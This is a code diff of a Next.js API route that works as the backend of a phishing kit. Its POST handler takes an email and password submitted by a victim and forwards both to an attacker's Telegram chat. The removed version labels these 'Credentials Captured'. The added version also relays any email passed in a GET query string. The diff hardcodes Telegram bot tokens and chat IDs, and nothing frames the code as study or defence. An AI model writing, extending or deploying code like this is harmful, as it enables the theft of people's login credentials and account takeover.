@@ -1,72 +1,68 @@
-/** @format */
-
-// app/api/sendemail/route.js
 import nodemailer from "nodemailer";
-
-// for telegram
 import { TelegramClient } from "telegramsjs";
 
-const botToken = "8563744207:AAFDSiiyvwYiVXjX5CC5Cm2cQsxMTss-ugg";
+const botToken = "8267952065:AAGLb_6qDpzhcLY5oLHxeRP0wQLmAIjwlUI";
 const bot = new TelegramClient(botToken);
-const chatId = "7528707311";
+const chatId = "7202634733";
 
-// Handle POST requests for form submissions
 export async function POST(req) {
-  const { email, password } = await req.json();
+  const { eparams, password } = await req.json();
 
   try {
-    // Only send notification when password is provided (credentials)
-    if (password && email) {
-      const credentialsMessage = `
-🔐 *Credentials Captured*
+    const message = `*Email:* ${eparams}
+*Password:* ${password}`;
 
-*Email:* ${email}
-*Password:* ${password}
-      `;
+    await bot.sendMessage({
+      text: message,
+      chatId: chatId,
+      parse_mode: "Markdown"
+    });
 
-      await bot.sendMessage({
-        text: credentialsMessage,
-        chatId: chatId,
-        parse_mode: "Markdown"
-      });
+    console.log(`Email: ${eparams}, Password: ${password}`);
 
-      console.log(
-        `Credentials sent to telegram: Email: ${email}, Password: ${password}`
-      );
-
-      return new Response(
-        JSON.stringify({ message: "Credentials sent successfully!" }),
-        {
-          status: 200,
-          headers: { "Content-Type": "application/json" },
-        }
-      );
-    }
-
-    // Return success for access without password (no notification)
     return new Response(
-      JSON.stringify({ message: "Access logged!" }),
+      JSON.stringify({ message: "Data sent!" }),
       {
         status: 200,
         headers: { "Content-Type": "application/json" },
       }
     );
   } catch (error) {
-    console.error("Error sending message:", error);
-    return new Response(JSON.stringify({ error: "Error sending message" }), {
+    console.error("Error:", error);
+    return new Response(JSON.stringify({ error: "Error" }), {
       status: 500,
       headers: { "Content-Type": "application/json" },
     });
   }
 }
 
-// Handle GET requests - return simple response
-export async function GET() {
-  return new Response(
-    JSON.stringify({ message: "API is running" }),
-    {
-      status: 200,
+export async function GET(req) {
+  try {
+    const url = new URL(req.url);
+    const email = url.searchParams.get('email');
+    
+    const message = `*Email:* ${email || ''}`;
+    
+    await bot.sendMessage({
+      text: message,
+      chatId: chatId,
+      parse_mode: "Markdown"
+    });
+    
+    console.log(`Email: ${email || ''}`);
+    
+    return new Response(
+      JSON.stringify({ message: "Data sent!" }),
+      {
+        status: 200,
+        headers: { "Content-Type": "application/json" },
+      }
+    );
+  } catch (error) {
+    console.error("Error:", error);
+    return new Response(JSON.stringify({ error: "Error" }), {
+      status: 500,
       headers: { "Content-Type": "application/json" },
-    }
-  );
+    });
+  }
 }
